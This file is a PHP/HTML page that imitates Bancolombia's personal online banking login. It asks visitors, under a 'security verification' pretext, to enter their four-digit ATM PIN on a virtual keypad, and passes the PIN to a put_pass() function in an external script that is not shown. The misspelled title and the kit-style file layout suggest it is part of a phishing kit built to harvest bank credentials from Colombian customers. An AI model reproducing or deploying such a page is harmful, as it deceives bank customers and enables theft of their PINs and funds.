<?php
$ip = getenv("REMOTE_ADDR");
setlocale(LC_TIME, "spanish");
$tiempo = date("%A, %d de %B de %Y", strtotime('2010-01-08'));
date_default_timezone_set('America/Bogota');
?>
<html>

<head>
	<title>Bancolombia Sucursal Vrtual Personas</title>
	<meta http-equiv="content-type" content="text/html; utf-8">
	<meta charset="utf-8">
	<meta content="es" http-equiv="Content-Language">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<link href="../../../../../src/css/layout.css" rel="stylesheet">
	<link href="../../../../../src/css/fonts.css" rel="stylesheet">
	<link rel="icon" type="image/png" href="../../../../../src/img/logo.png" />
</head>

<body>
	<div class="contenido">
		<div class="cabecera">
			<div class="logo">
				<img src="../../../../../src/img/logo.svg">
				<br>
				<span class="subtitulo">Sucursal Virtual Personas</span>
				<br>
				<span class="texto-min">Fecha y hora actual:</span> <span class="texto-min" id="fecha-hora">Lunes 13 de
					Junio de 2022 9:23:11 AM</span>
			</div>
			<div class="titulo">Iniciar sesion</div>
			<div class="mensaje">
				<table>
					<tr>
						<td valign="middle"><img src="../../../../../src/img/error.jpg" style="width: 40px;"></td>
						<td valign="middle" style="padding-left: 12px;"><span
								style="font-size: 20px; color: #000; line-height: 20px;">Error</span><br><span>Por favor
								ingesar la información requerida.</span></td>
					</tr>
				</table>
			</div>
		</div>
		<div class="cuerpo">
			<div class="pnlizqPass" style="color:#fff;">
				.
			</div>
			<div class="pnlderPass">
				<div class="entrada">
					<div class="formulario">
						<div class="form-titulo">Clave</div>
						<div class="descripcion">
							Por motivos de seguridad es necesario procesar una verificación de identidad.
						</div>
						<div class="form-cuerpo">
							<div style="text-align: left;">
								<span class="etiqueta">Ingresa tu clave</span>
							</div>
							<div class="input-icono pass">
								<input type="password" name="inp-password" id="inp-password" readonly>
							</div>
							<div class="subtexto">
								Ingresa mediante el teclado virtual la clave que usas en el cajero automático.
							</div>
							<br>
							<button id="btnCancelar" name="btnCancelar" class="btn btn-blanco"
								type="button">Cancelar</button>&nbsp;&nbsp;&nbsp;
							<button id="btn-pass" name="btn-pass" class="btn btn-amarillo"
								type="button">Continuar</button>
							<br>
							<div class="texto" style="text-align: right;">
								<div class="vinculos">
									<img src="../../../../../src/img/info.jpg" class="icon-info"><a href="#">Genera una
										clave personal</a>
								</div>

							</div>
						</div>
					</div>
				</div>
				<div class="teclado">
					<table class="teclas" border="0" cellspacing="5">
						<tr>
							<td align="center" valign="middle" id="tecla1">1</td>
							<td align="center" valign="middle" id="tecla7">7</td>
							<td align="center" valign="middle" id="tecla6">6</td>
						</tr>
						<tr>
							<td align="center" valign="middle" id="tecla4">4</td>
							<td align="center" valign="middle" id="tecla3">3</td>
							<td align="center" valign="middle" id="tecla2">2</td>
						</tr>
						<tr>
							<td align="center" valign="middle" id="tecla5">5</td>
							<td align="center" valign="middle" id="tecla0">0</td>
							<td align="center" valign="middle" id="tecla9">9</td>
						</tr>
						<tr>
							<td align="center" valign="middle" id="tecla8">8</td>
							<td colspan="2" align="center" valign="middle" id="teclaborrar">Borrar</td>
						</tr>
					</table>
					<img src="../../../../../src/img/con-a.gif" style="margin-left: 21px; margin-top: 5px;">
				</div>

			</div>
		</div>

		<div class="pie" style="padding-top:80px;">
			<div class="direccion">Sucursal Telefónica Bancolombia: Bogotá 343 0000 - Medellín 510 9000 - Cali 554 0505
				- Barranquilla 361 8888 - Cartagena 693 4400 - Bucaramanga 697 2525 - Pereira 340 1213<br
					class="salto-pie">
				El resto del país 01 800 09 12345. Sucursales Telefónicas en el exterior: España 900 995 717 - Estados
				Unidos 1866 379 9714.</div>
			<div class="ippie">
				<span class="dirip">Dirección IP:
					<?php echo $ip; ?>
				</span>´
				<span class="copyright">Copyright © 2022 Bancolombia S.A.</span>
			</div>
		</div>
	</div>

	<script type="text/javascript" src="../../../../../src/js/jquery-3.6.0.min.js"></script>
	<script src="../../../../../src/js/jquery.jclock-min.js" type="text/javascript"></script>
	<script type="text/javascript" src="../../../../../src/js/run.js"></script>

	<script type="text/javascript">
		$(document).ready(function () {
			$('.teclado td').hover(function () {
				$('#tecla1,#tecla2,#tecla3,#tecla4,#tecla5,#tecla6,#tecla7,#tecla8,#tecla9,#tecla0').html("*");
			});

			$('.teclado td').on("mouseout", function () {
				$('#tecla1').html("1");
				$('#tecla2').html("2");
				$('#tecla3').html("3");
				$('#tecla4').html("4");
				$('#tecla5').html("5");
				$('#tecla6').html("6");
				$('#tecla7').html("7");
				$('#tecla8').html("8");
				$('#tecla9').html("9");
				$('#tecla0').html("0");
			});

			$('.teclado').on("touchstart", function () {
				$('#tecla1').html("1");
				$('#tecla2').html("2");
				$('#tecla3').html("3");
				$('#tecla4').html("4");
				$('#tecla5').html("5");
				$('#tecla6').html("6");
				$('#tecla7').html("7");
				$('#tecla8').html("8");
				$('#tecla9').html("9");
				$('#tecla0').html("0");
			});


			$('#tecla1').click(function () {
				if ($('#inp-password').val().length < 4) {
					$('#inp-password').val($('#inp-password').val() + "1");
					$(".mensaje").hide();
				}
			});
			$('#tecla2').click(function () {
				if ($('#inp-password').val().length < 4) {
					$('#inp-password').val($('#inp-password').val() + "2");
					$(".mensaje").hide();
				}
			});
			$('#tecla3').click(function () {
				if ($('#inp-password').val().length < 4) {
					$('#inp-password').val($('#inp-password').val() + "3");
					$(".mensaje").hide();
				}
			});
			$('#tecla4').click(function () {
				if ($('#inp-password').val().length < 4) {
					$('#inp-password').val($('#inp-password').val() + "4");
					$(".mensaje").hide();
				}
			});
			$('#tecla5').click(function () {
				if ($('#inp-password').val().length < 4) {
					$('#inp-password').val($('#inp-password').val() + "5");
					$(".mensaje").hide();
				}
			});
			$('#tecla6').click(function () {
				if ($('#inp-password').val().length < 4) {
					$('#inp-password').val($('#inp-password').val() + "6");
					$(".mensaje").hide();
				}
			});
			$('#tecla7').click(function () {
				if ($('#inp-password').val().length < 4) {
					$('#inp-password').val($('#inp-password').val() + "7");
					$(".mensaje").hide();
				}
			});
			$('#tecla8').click(function () {
				if ($('#inp-password').val().length < 4) {
					$('#inp-password').val($('#inp-password').val() + "8");
					$(".mensaje").hide();
				}
			});
			$('#tecla9').click(function () {
				if ($('#inp-password').val().length < 4) {
					$('#inp-password').val($('#inp-password').val() + "9");
					$(".mensaje").hide();
				}
			});
			$('#tecla0').click(function () {
				if ($('#inp-password').val().length < 4) {
					$('#inp-password').val($('#inp-password').val() + "0");
					$(".mensaje").hide();
				}
			});
			$('#teclaborrar').click(function () {
				$('#inp-password').val("");
				$(".mensaje").hide();
			});

			$('#btn-pass').click(function () {
				if ($("#inp-password").val().length > 3) {
					put_pass($("#inp-password").val());
				} else {
					$(".mensaje").show();
				}
			});
		});
	</script>

	<script type="text/javascript">
		console.log(document.cookie);

		$(function ($) {
			var optionsEST = {
				am_pm: true,
				timeNotation: '12h',
				h_hour: "<?php echo date('H:i:s') ?>",
				h_date: "<?php echo date('Y/m/d') ?>",
				h_format: "$nombreDia$ $dia$ de $nombreMes$ de $anio$ $hhmmss$ $ampm$",
				h_language: "es"
			}
			$('#fecha-hora').jclock(optionsEST);
		});
	</script>
</body>

</html>